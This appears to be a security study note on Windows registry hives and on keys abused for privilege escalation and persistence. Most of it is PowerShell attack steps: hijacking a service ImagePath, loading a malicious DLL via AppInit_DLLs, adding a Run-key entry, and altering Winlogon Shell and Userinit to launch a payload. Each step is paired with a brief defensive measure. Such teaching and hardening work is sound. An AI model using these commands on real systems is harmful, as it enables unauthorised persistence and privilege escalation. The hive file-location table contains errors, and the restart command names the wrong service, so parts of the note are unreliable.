
---
## **1. Registry Hives**

The Windows registry is a **hierarchical database** structured into **hives**, which store **system and user settings**.

### **📌 Five Main Registry Hives**

|Hive|Description|File Location|
|---|---|---|
|**HKCR**|File associations & COM objects|`C:\Windows\System32\Config\Software`|
|**HKLM**|System-wide settings|`C:\Windows\System32\Config\SYSTEM`|
|**HKU**|All user profiles|`C:\Windows\System32\Config\DEFAULT`|
|**HKCU**|Current user settings|`C:\Users\<User>\NTUSER.DAT`|
|**HKCC**|Hardware profile info|`C:\Windows\System32\Config\SystemProfile`|

These registry locations are **important** because **misconfigurations** or **weak permissions** can allow attackers to escalate privileges.

---

## **2. Critical Registry Paths**

Certain registry paths can **allow privilege escalation** if misconfigured.

---

### **🔴 2.1 `HKLM\SYSTEM\CurrentControlSet\Services\`**

**💡 Purpose:**  
This key stores **service configurations**. If an attacker can modify a service's ==`ImagePath`==, they can **replace it with a malicious executable**.

**💀 Exploitation:**

1. Modify a service's executable path:
    

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService" -Name ImagePath -Value "C:\Users\Quickemu\Downloads\test.exe"
```

2. Verify the change:
    

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService"
```

3. Restart the service to execute the payload:
    

```powershell
Restart-Service -Name test
```

📌 **Defensive Measure:** Restrict access to `HKLM\SYSTEM\CurrentControlSet\Services\`.

---

### **🔴 2.2 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`**

**💡 Purpose:**  
The `AppInit_DLLs` registry key loads **DLLs into every user-mode process that uses the Windows GUI subsystem**.

**💀 Exploitation:**

- If an attacker **injects a malicious DLL**, it will be loaded by **every GUI-based process**, making it a powerful persistence technique.
    

**🚀 Attack Steps:**

1. Enable `AppInit_DLLs`:
    

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -Value 1
```

2. Add a malicious DLL:
    

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value "C:\Path\To\Malicious.dll"
```

3. Verify:
    

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs"
```

📌 **Defensive Measure:** Modern Windows versions have mitigations for `AppInit_DLLs`, but it should still be **monitored**.

---

### **🔴 2.3 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`**

**💡 Purpose:**

- Runs programs at **system startup**.
    
- If **writable by non-admin users**, attackers can **insert malicious entries** to persist execution.
    

**🚀 Attack Steps:**

1. Add a malicious program to start automatically:
    

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "EvilProgram" -Value "C:\Users\Quickemu\Downloads\malicious.exe"
```

2. Verify:
    

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

📌 **Defensive Measure:** Monitor startup entries for suspicious applications.

---

### **🔴 2.4 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`**

**💡 Purpose:**  
Controls **Windows login behavior**. Certain values here can be abused to **replace login shells** with malicious executables.

#### **🚀 Attack Steps:**

1. Change the default shell to `cmd.exe`:
    

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "cmd.exe"
```

2. Change back to **explorer.exe**:
    

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe"
```

3. Modify `Userinit` to execute a malicious binary:
    

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Windows\system32\userinit.exe, C:\Malicious\Payload.exe"
```

📌 **Defensive Measure:** **Monitor changes** to `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`.

---

## **3. References**

📖 [Windows Registry Hives](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)  
📖 [The Windows Registry Adventure #4](https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html)  
📖 [Mysteries of the Registry](https://scorpiosoftware.net/2022/04/15/mysteries-of-the-registry/)

---

## **🛡️ Defensive Recommendations**

✔️ **Restrict Write Permissions**: Prevent low-privileged users from modifying sensitive registry keys.  
✔️ **Use Group Policy**: Disable `AppInit_DLLs` and restrict `Run` entries.  
✔️ **Monitor Registry Changes**: Use **Sysmon** to log modifications to these registry paths.  
✔️ **Regular Audits**: Identify **misconfigurations** in registry permissions.

---
